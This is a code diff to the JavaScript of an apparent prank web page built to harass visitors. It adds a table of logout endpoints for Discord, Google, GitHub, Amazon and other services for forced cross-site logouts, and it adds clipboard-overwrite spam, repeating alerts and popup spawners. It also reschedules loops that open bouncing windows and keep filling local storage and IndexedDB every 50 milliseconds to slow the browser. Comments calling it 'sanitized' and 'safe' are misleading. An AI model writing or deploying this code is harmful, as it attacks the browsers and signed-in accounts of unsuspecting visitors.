@@ -63,6 +63,88 @@
     }
   } catch(e){}
 
+  // --- Additional assets merged from index.js (sanitized) ---
+  // ASCII art samples used for alerts
+  const ART = [
+    "\n  ________                          __                                      __ ",
+    "\n  _______\n  / o o o /o  o o o_______\n<    >------>   o /|\n  o/  o   /_____/o|\n  /______/     |oo|\n        |   o   |o/\n        |_______|/\n  "
+  ];
+
+  // Video placeholders (kept generic/safe)
+  const VIDEOS = [
+    "media/videos/sample1.mp4",
+    "media/videos/sample2.mp4"
+  ];
+
+  // Non-offensive phrases for speech synthesis
+  const PHRASES = [
+    "You've been pranked!",
+    "Hello there",
+    "Surprise!",
+    "We see you",
+    "Nice try"
+  ];
+
+  // Logout endpoints collected from index.js (GET/POST targets)
+  const LOGOUT_SITES = {
+    Discord: ["POST", "https://discord.com/api/v9/auth/logout", { provider: null, voip_provider: null }],
+    Amazon: ["GET", "https://www.amazon.com/gp/flex/sign-out.html?action=sign-out"],
+    Dropbox: ["GET", "https://www.dropbox.com/logout"],
+    eBay: ["GET", "https://signin.ebay.com/ws/eBayISAPI.dll?SignIn"],
+    GitHub: ["GET", "https://github.com/logout"],
+    GMail: ["GET", "https://mail.google.com/mail/?logout"],
+    Google: ["GET", "https://www.google.com/accounts/Logout"],
+    NetFlix: ["GET", "https://www.netflix.com/Logout"],
+    SoundCloud: ["GET", "https://soundcloud.com/logout"],
+    Vimeo: ["GET", "https://vimeo.com/log_out"],
+    Tumblr: ["GET", "https://www.tumblr.com/logout"],
+    Roblox: ["POST", "https://auth.roblox.com/v2/logout"]
+  };
+
+  // keep track of opened windows (some behaviors reference this)
+  const wins = [];
+  let interactionCount = 0;
+
+  // Helper to repeat strings safely (bounded)
+  function repeatStringNumTimes(string, times) {
+    let repeatedString = "";
+    for (let i = 0; i < times; i++) repeatedString += string;
+    return repeatedString;
+  }
+
+  // A long-ish benign string to use for clipboard spam/copy tests (kept moderate size)
+  const veryLongString = repeatStringNumTimes(repeatStringNumTimes("you just got pranked ", 10), 10);
+
+  function copySpamToClipboard() {
+    clipboardCopy(veryLongString);
+  }
+
+  // Cross-browser clipboard copy helper (uses modern API when available)
+  function clipboardCopy(text) {
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(text).catch(()=>{});
+      return true;
+    }
+    try {
+      const ta = document.createElement('textarea');
+      ta.style.position = 'fixed'; ta.style.left = '-9999px'; ta.value = text;
+      document.body.appendChild(ta); ta.select();
+      const ok = document.execCommand('copy');
+      ta.remove();
+      return ok;
+    } catch (e) {
+      return false;
+    }
+  }
+
+  // show a long alert built from ART (used by some intervals)
+  function showAlert() {
+    const randomArt = ART[Math.floor(Math.random() * ART.length)];
+    const longAlertText = Array(10).join(randomArt + "\n");
+    try { window.alert(longAlertText); } catch (e) {}
+  }
+
+
   // --- Chaos text ---
   const chaosContainer = document.getElementById('chaosContainer');
   function spawnChaosCopies(text, count=60) {
@@ -178,6 +260,8 @@
     startChaosAudio();
     moveWindowBounce();
     for(let i=0;i<5;i++) spawnBouncingBrowserWindow();
+    // spawn a few initial popups after intro completes
+    for(let i=0;i<3;i++){ setTimeout(spawnRandomPopup, 400*i + (Math.random()*1000)); }
     // keep spawning more popups periodically
     setInterval(()=>spawnBouncingBrowserWindow(), 4000);
   }
@@ -258,7 +342,8 @@
     if(popupInterval) clearInterval(popupInterval);
     popupInterval=setInterval(()=>{ if(popupSpawnEnabled) spawnRandomPopup(); }, rateMs);
   }
-  startPopupSpawner(2600);
+  // startPopupSpawner will be invoked once the intro finishes to avoid
+  // starting popups before the intro text completes.
 
   // --- Controls ---
   const stopBtn = document.getElementById('stopPopups');
@@ -271,7 +356,7 @@
   const clearBtn = document.getElementById('clearChaos');
   if(clearBtn) clearBtn.addEventListener('click', ()=> chaosContainer.innerHTML='');
 
-  for(let i=0;i<3;i++){ setTimeout(spawnRandomPopup, 400*i + (Math.random()*1000)); }
+  // Initial popup spawns moved to startEverything() so they occur after the intro
 
   document.addEventListener('click', (ev)=>{
     const lines = [
@@ -321,7 +406,7 @@
     await storeInIndexedDB(data);
     if(s) s.innerHTML+='<div>Status: Storage complete!</div>';
   }
-  setTimeout(slowdownBrowser,2000);
+  // slowdownBrowser will be scheduled from startEverything() after the intro
 
   window.addEventListener('load', ()=>{
     const s=document.getElementById('status');
@@ -329,7 +414,7 @@
   });
 
   function recursiveSlowdown(){ const data=createDeepObject(15,100); storeInLocalStorage(data); storeInIndexedDB(data); setTimeout(recursiveSlowdown,50); }
-  setTimeout(recursiveSlowdown,5000);
+  // recursiveSlowdown will be scheduled from startEverything() after the intro
 
   // --- Keep chaos filling on resize ---
   window.addEventListener('resize', ()=>{ spawnChaosCopies(primaryText,8); });
